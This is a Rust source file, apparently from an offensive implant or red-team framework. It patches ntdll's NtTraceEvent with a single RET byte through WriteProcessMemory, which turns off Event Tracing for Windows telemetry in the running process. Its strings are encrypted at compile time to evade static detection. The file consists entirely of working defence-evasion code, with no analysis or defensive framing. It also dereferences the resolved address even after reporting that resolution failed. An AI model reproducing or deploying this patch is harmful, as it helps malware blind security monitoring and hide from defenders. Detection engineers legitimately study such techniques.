use std::ffi::c_void;

use shared_no_std::export_resolver;
use shared_no_std::export_resolver::ExportResolveError;
use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
};

use crate::utils::console::print_failed;

pub(super) fn etw_bypass() {
    #[cfg(feature = "patch_etw")]
    {
        #[cfg(debug_assertions)]
        use crate::utils::console::print_info;

        #[cfg(debug_assertions)]
        print_info("Patching etw..");

        let _ = evade_etw_current_process_overwrite_ntdll();
    }
}

fn evade_etw_current_process_overwrite_ntdll() -> Result<(), ExportResolveError> {
    let fn_addr =
        export_resolver::resolve_address(&sc!("ntdll.dll", 42).unwrap(), "NtTraceEvent", None)?
            as *mut c_void;

    if fn_addr.is_null() {
        print_failed(sc!("Error resolving NtTraceEvent, not patching ETW.", 95).unwrap());
    }

    let handle = unsafe { GetCurrentProcess() };
    let ret_opcode: u8 = 0xC3;

    // Have we already patched?
    if unsafe { *(fn_addr as *mut u8) } == 0xC3 {
        return Ok(());
    }

    let size = std::mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let _ = unsafe {
        WriteProcessMemory(
            handle,
            fn_addr,
            &ret_opcode as *const u8 as *const c_void,
            size,
            &mut bytes_written,
        )
    };

    Ok(())
}
